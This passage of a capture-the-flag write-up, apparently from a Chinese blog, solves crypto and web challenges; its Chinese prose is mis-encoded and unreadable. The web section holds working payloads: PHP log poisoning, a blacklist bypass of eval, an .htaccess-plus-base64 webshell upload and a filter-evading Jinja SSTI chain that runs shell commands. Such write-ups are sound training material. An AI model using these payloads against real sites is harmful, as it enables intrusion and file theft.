class="number">1920358673646340365826516899186299898354902389402251443712585240681673718967552394250439615271108958695077816395789102908554482423707690040360881719002797624203057223577713119411615697309430781610828105111854807558984242631896605944487456402584672441464316236703857236007195673926937583757881853655505218912262929700452404084</span></span><br><span class="line">c = <span class="built_in">hex</span>(c)[<span class="number">2</span>:].rjust(<span class="number">9</span>*<span class="number">30</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;0123456789abcdef-&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pow</span>(<span class="params">nowc</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(nowc)</span><br><span class="line">    t=l.<span class="built_in">next</span>()</span><br><span class="line">    <span class="built_in">print</span>(t)</span><br><span class="line">    <span class="keyword">return</span> mbruteforce(<span class="keyword">lambda</span> x: <span class="built_in">hex</span>(<span class="built_in">int</span>(sha256(x).hexdigest().encode(<span class="string">&#x27;hex&#x27;</span>),<span class="number">16</span>)%(seed**<span class="number">3</span>)^(t%<span class="number">100</span>))[<span class="number">2</span>:].rjust(<span class="number">30</span>,<span class="string">&#x27;0&#x27;</span>) == nowc, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    flag += <span class="built_in">pow</span>(c[<span class="number">30</span>*i:<span class="number">30</span>*(i+<span class="number">1</span>)])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># d2a4d1af-8a80-8794-99ac-635f89494cac</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="Bag"><a href="#Bag" class="headerlink" title="Bag"></a>Bag</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">message = bytes_to_long(flag[<span class="number">8</span>:-<span class="number">1</span>])</span><br><span class="line">Baglenth=<span class="number">286</span></span><br><span class="line">Bag=[]</span><br><span class="line">Bag=Bag[::-<span class="number">1</span>]</span><br><span class="line">m=<span class="number">372992427307339981616536686110115630075342113098010788080347982669869622759400031649792</span></span><br><span class="line">w=<span class="number">274062421102700155372289583695782343443</span></span><br><span class="line"><span class="keyword">assert</span> gmpy2.gcd(m,w)==<span class="number">1</span></span><br><span class="line">h=<span class="number">0</span></span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> m.bit_length()%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">    h=m.bit_length()</span><br><span class="line">    j=<span class="built_in">int</span>(h//<span class="number">2</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    h=m.bit_length()</span><br><span class="line">    j=<span class="built_in">int</span>(h//<span class="number">2</span>+<span class="number">1</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">m,lenth</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(m)&lt;lenth:</span><br><span class="line">        m=<span class="string">&#x27;0&#x27;</span>+m</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span>():</span></span><br><span class="line">    pk=[]</span><br><span class="line">    sk=[]</span><br><span class="line">    sk.append(m)</span><br><span class="line">    sk.append(<span class="built_in">int</span>(gmpy2.invert(w,m)))</span><br><span class="line">    D=[]</span><br><span class="line">    binD=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Baglenth):</span><br><span class="line">        di=(w*Bag[i])%m</span><br><span class="line">        D.append(di)</span><br><span class="line">        bindi=<span class="built_in">bin</span>(di)[<span class="number">2</span>:]</span><br><span class="line">        bindi=pad(bindi,h)</span><br><span class="line">        binD.append(bindi)</span><br><span class="line">    U=[]</span><br><span class="line">    V=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Baglenth):</span><br><span class="line">        tempu=<span class="built_in">int</span>(<span class="built_in">str</span>(binD[i][:j]),<span class="number">2</span>)</span><br><span class="line">        U.append(tempu)</span><br><span class="line">        tempv=<span class="built_in">int</span>(<span class="built_in">str</span>(binD[i][j:]),<span class="number">2</span>)</span><br><span class="line">        V.append(tempv)</span><br><span class="line">    e=gmpy2.next_prime(<span class="built_in">sum</span>(V))+<span class="number">2</span></span><br><span class="line">    f=gmpy2.next_prime(<span class="built_in">sum</span>(U))</span><br><span class="line">    <span class="keyword">assert</span> gmpy2.gcd(e,f)==<span class="number">1</span></span><br><span class="line">    sk.append(<span class="built_in">int</span>(e))</span><br><span class="line">    sk.append(<span class="built_in">int</span>(f))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Baglenth):</span><br><span class="line">        ai=e*U[i]+f*V[i]</span><br><span class="line">        pk.append(<span class="built_in">int</span>(ai))</span><br><span class="line">    <span class="keyword">return</span> pk,sk</span><br><span class="line">Pk,Sk=keygen()</span><br><span class="line"><span class="built_in">print</span>(Pk)</span><br><span class="line"><span class="built_in">print</span>(Sk)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Encrypt</span>(<span class="params">plain,pk</span>):</span></span><br><span class="line">    mbin=<span class="built_in">bin</span>(plain)[<span class="number">2</span>:]</span><br><span class="line">    c=<span class="number">0</span></span><br><span class="line">    mbin=pad(mbin,Baglenth)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Baglenth):</span><br><span class="line">        c=c+<span class="built_in">int</span>(mbin[i])*pk[i]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">c=Encrypt(message,Pk)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure></blockquote><p>èƒŒåŒ…å¯†ç ç³»ç»Ÿï¼ŒLLLç®—æ³•è§£ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">pubKey = []</span><br><span class="line">nbit = <span class="built_in">len</span>(pubKey)</span><br><span class="line">encoded = </span><br><span class="line">A = Matrix(ZZ, nbit + <span class="number">1</span>, nbit + <span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbit):</span><br><span class="line">    A[i, i] = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbit):</span><br><span class="line">    A[i, nbit] = pubKey[i]</span><br><span class="line">A[nbit, nbit] = -<span class="built_in">int</span>(encoded)</span><br><span class="line"></span><br><span class="line">res = A.LLL()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, nbit + <span class="number">1</span>):</span><br><span class="line">    M = res.row(i).<span class="built_in">list</span>()</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> M:</span><br><span class="line">        <span class="keyword">if</span> m != <span class="number">0</span> <span class="keyword">and</span> m != <span class="number">1</span>:</span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(i, M)</span><br><span class="line">        M = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(j) <span class="keyword">for</span> j <span class="keyword">in</span> M)</span><br><span class="line">        M = M[:-<span class="number">1</span>]</span><br><span class="line">        M = <span class="built_in">hex</span>(<span class="built_in">int</span>(M, <span class="number">2</span>))[<span class="number">2</span>:]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(M))</span><br><span class="line">        </span><br><span class="line"><span class="string">b&#x27;5090ea29-8cb6-4ad8-ab43-1e6f65cc8eeb&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="phpdest"><a href="#phpdest" class="headerlink" title="phpdest"></a>phpdest</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>æ–‡ä»¶åŒ…å«ï¼Œç»• <code>require_once</code>ï¼Œburpsuiteæˆ– <code>curl -A</code> ä¿®æ”¹User-Agentä¸º <code>&lt;?php show_source(&quot;flag.php&quot;);?&gt;</code>ï¼Œ</p><p>ç„¶åç”¨æ—¥å¿—åŒ…å« <code>?file=/var/log/nginx/access.log</code> å¾—åˆ°flagã€‚</p><p>â€‹    </p><h3 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h3><blockquote><p>Post something</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;fl4g.php&quot;</span>;</span><br><span class="line"><span class="variable">$dest0g3</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = date(<span class="string">&quot;H&quot;</span>);</span><br><span class="line"><span class="variable">$timme</span> = date(<span class="string">&quot;d&quot;</span>);</span><br><span class="line"><span class="variable">$timmme</span> = date(<span class="string">&quot;i&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$time</span> &gt; <span class="string">&quot;24&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timme</span> &gt; <span class="string">&quot;31&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timmme</span> &gt; <span class="string">&quot;60&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$fl4g</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try harder!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">set_error_handler(</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="keyword">use</span>(<span class="params">&amp;<span class="variable">$fl4g</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable">$fl4g</span>;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable">$fl4g</span> .= <span class="variable">$dest0g3</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>å¼‚å¸¸å¤„ç†å‡½æ•° <code>use()</code> ä¸­è¾“å‡ºflagï¼Œä¼ å‚æ—¶ä¼ å…¥æ•°ç»„å³å¯è§¦å‘å¼‚å¸¸ï¼š<code>ctf[]=1</code>ã€‚</p><p>â€‹    </p><h3 id="SimpleRCE"><a href="#SimpleRCE" class="headerlink" title="SimpleRCE"></a>SimpleRCE</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$aaa</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;aaa&#x27;</span>];</span><br><span class="line"><span class="variable">$black_list</span>=<span class="keyword">array</span>(<span class="string">&#x27;^&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;%0&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;char&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;ascii&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;replace&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;var&#x27;</span>,<span class="string">&#x27;pastre&#x27;</span>,<span class="string">&#x27;print&#x27;</span>,<span class="string">&#x27;tail&#x27;</span>,<span class="string">&#x27;sed&#x27;</span>,<span class="string">&#x27;pcre&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;scan&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;diff&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;pcntl&#x27;</span>,<span class="string">&#x27;proc_open&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;tac&#x27;</span>,<span class="string">&#x27;more&#x27;</span>,<span class="string">&#x27;sort&#x27;</span>,<span class="string">&#x27;log&#x27;</span>,<span class="string">&#x27;current&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;cut&#x27;</span>,<span class="string">&#x27;bash&#x27;</span>,<span class="string">&#x27;nl&#x27;</span>,<span class="string">&#x27;wget&#x27;</span>,<span class="string">&#x27;vi&#x27;</span>,<span class="string">&#x27;grep&#x27;</span>);</span><br><span class="line"><span class="variable">$aaa</span> = str_ireplace(<span class="variable">$black_list</span>,<span class="string">&quot;hacker&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>é»‘åå•ç»•è¿‡rceï¼Œç”¨16è¿›åˆ¶ç¼–ç ç»•è¿‡ï¼š<code>aaa=hex2bin(&#39;73797374656d&#39;)(&#39;uniq /f*&#39;);</code></p><p>â€‹    </p><h3 id="funny-upload"><a href="#funny-upload" class="headerlink" title="funny_upload"></a>funny_upload</h3><p>æ–‡ä»¶ä¸Šä¼ åç¼€ç™½åå•ç»•è¿‡ï¼Œåˆ©ç”¨.htaccessæ–‡ä»¶å®ç°éPHPæ–‡ä»¶è§£ææˆPHPä»£ç æ‰§è¡Œã€‚</p><p>å…ˆä¸Šä¼  <code>.htaccess</code> æ–‡ä»¶ï¼Œç”±äºæ–‡ä»¶ä¸­ä¸èƒ½åŒ…å« <code>&lt;?</code> ï¼Œç”¨PHPä¼ªåè®®base64è§£ç å¤„ç†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .xxx</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.xxx&quot;</span><br></pre></td></tr></table></figure><p>å†ä¸Šä¼ base64ç¼–ç åçš„ <code>shell.xxx</code> æ–‡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgcHJpbnRfcihmaWxlX2dldF9jb250ZW50cygnL2ZsYWcnKSk7</span><br></pre></td></tr></table></figure><p>è®¿é—® <code>shell.xxx</code>ï¼Œå…¶ä¸­å†…å®¹ <code>&lt;?php print_r(file_get_contents(&#39;/flag&#39;));</code> ä»¥PHPä»£ç æ‰§è¡Œï¼Œå¾—åˆ°flagã€‚</p><p>â€‹    </p><h3 id="EasySSTI"><a href="#EasySSTI" class="headerlink" title="EasySSTI"></a>EasySSTI</h3><p>ç™»å½•æ¡†éšä¾¿è¾“å…¥è´¦å·å¯†ç ï¼Œè¿›å…¥ <code>Hello xxx</code> ç•Œé¢ï¼Œå°è¯•æ›´æ¢è´¦å·ä¸º <code>&#123;&#123;2*3&#125;&#125;</code>ï¼Œå‡ºç° <code>Hello 6</code>ï¼Œå¯åˆ©ç”¨SSTIæ³¨å…¥rceã€‚</p><p>Fuzzå‘ç°è¿‡æ»¤äº†å¾ˆå¤šç¬¦å·ï¼ŒåŒ…æ‹¬ <code>request _ &#39; &quot; [ . ç©ºæ ¼ class getitem import</code> ç­‰ï¼Œä¸è¿‡ <code>config</code> å¯ç”¨ï¼Œå¯ä» <code>&#123;&#123;config&#125;&#125;</code> å†…å®¹å­—ç¬¦ä¸²ä¸­æ‰¾åˆ°æ‰€éœ€å­—ç¬¦æ¥æ‹¼æ¥æ„é€ å­—ç¬¦ä¸²ï¼Œå¯ä»¥é¿å…ç”¨åˆ°å¼•å·ï¼›è¿‡æ»¤çš„å…³é”®è¯ä½¿ç”¨ <code>dict(cla=aa,ss=bb)|join()</code> å½¢å¼ç»•è¿‡ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _</span></span><br><span class="line">config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>)</span><br><span class="line"><span class="comment"># ç©ºæ ¼</span></span><br><span class="line">config|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># /</span></span><br><span class="line">config|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">279</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># __class__</span></span><br><span class="line">(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(cla=aa,ss=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># config.__class__.__init__.__globals__</span></span><br><span class="line">config|attr((config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(cla=aa,ss=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>)|attr((config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(<span class="keyword">in</span>=aa,it=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>)|attr((config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(glo=aa,bals=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()</span></span><br><span class="line">config|attr((config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(cla=aa,ss=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>)|attr((config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(<span class="keyword">in</span>=aa,it=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>)|attr((config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(glo=aa,bals=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>)|attr((config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>+<span class="built_in">dict</span>(geti=aa,tem=bb)|join()+(config|<span class="built_in">list</span>()|last()|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">3</span>))*<span class="number">2</span>)(<span class="built_in">dict</span>(o=aa,s=bb)|join())|attr(<span class="built_in">dict</span>(po=aa,pen=bb)|join())(<span class="built_in">dict</span>(c=aa,at=bb)|join()+config|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">7</span>)+config|string()|<span class="built_in">list</span>()|attr(<span class="built_in">dict</span>(p=aa,op=bb)|join())(<span class="number">279</span>)+<span class="built_in">dict</span>(fl=aa,ag=bb)|join())|attr(<span class="built_in">dict</span>(re=aa,ad=bb)|join())()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="middle"><a href="#middle" class="headerlink" title="middle"></a>middle</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> config</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template, url_for,redirect,make_response</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">in</span> [<span class="string">&#x27;config&#x27;</span>] <span class="keyword">and</span> <span class="string">&quot;__&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[module], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    base_dir = os.path.dirname(__file__)</span><br><span class="line">    resp = make_response(<span class="built_in">open</span>(os.path.join(base_dir, __file__)).read()+<span class="built_in">open</span>(os.path.join(base_dir, <span class="string">&quot;config/__init__.py&quot;</span>)).read())</span><br><span class="line">    resp.headers[<span class="string">&quot;Content-type&quot;</span>] = <span class="string">&quot;text/plain;charset=UTF-8&quot;</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/home&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span 